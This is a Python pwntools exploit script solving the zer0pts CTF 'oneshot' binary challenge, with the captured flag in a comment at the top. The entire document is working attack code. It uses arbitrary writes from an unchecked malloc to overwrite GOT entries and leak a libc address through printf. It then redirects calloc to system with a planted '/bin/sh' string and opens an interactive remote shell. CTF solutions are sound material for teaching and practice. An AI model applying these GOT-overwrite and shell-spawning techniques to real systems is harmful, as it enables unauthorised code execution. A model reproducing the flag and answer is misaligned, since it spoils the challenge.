#flag = zer0pts{th1s_1s_why_y0u_sh0uld_ch3ck_r3turn_v4lu3_0f_malloc}
from pwn import *

libc = ELF("./libc.so.6")
elf = ELF("./oneshot")
ld = ELF("./ld-2.31.so")

#target = process([elf.path, ld.path], env={"LD_PRELOAD": libc.path})
target = remote('pwn.ctf.zer0pts.com', 9004)

def overwrite(addr, data):
    target.sendline(str(int(0x80001000)))
    target.sendline(str(int(addr)))
    target.sendline(str(int(data)))

overwrite(elf.got['puts']/4, elf.sym['main'])
overwrite(elf.got['setbuf']/4, 0x4007a4)
overwrite(elf.got['setbuf']/4 + 1, 0x0)
overwrite(elf.got['exit']/4, 0x40083f)
binsh = 0x601200
overwrite(binsh/4, u32("/bin"))
overwrite(binsh/4 + 1, u32("/sh\x00"))

def memfill(n, i, data):
    target.sendline(str(int(n)))
    target.sendline(str(int(i)))
    target.sendline(str(int(data)))

memfill(0x200, (elf.got['calloc'] - 0x200)/4, elf.plt['printf'])
memfill(0x200, (elf.got['calloc'] - 0x200)/4 + 1, 0x0)
memfill(0x200, (elf.got['exit'] - 0x200)/4, 0x400821)

#Leak LIBC
memfill(elf.got['printf'], 0x601210/4, 0x41414141)

target.recvuntil('\x10')
libc_base = u64('\x10' + target.recv(5) + '\x00'*2) - libc.sym['printf']
log.info("LIBC Base: " + hex(libc_base))

memfill(0x601240, elf.got['exit']/4, 0x40083f)

memfill(0x200, (elf.got['calloc'] - 0x200)/4, (libc_base + libc.sym['system']) & 0xffffffff)
memfill(0x200, (elf.got['calloc'] - 0x200)/4 + 1, (libc_base + libc.sym['system']) >> 32)

memfill(0x200, (elf.got['exit'] - 0x200)/4, 0x400821)

target.sendline(str(binsh))

target.interactive()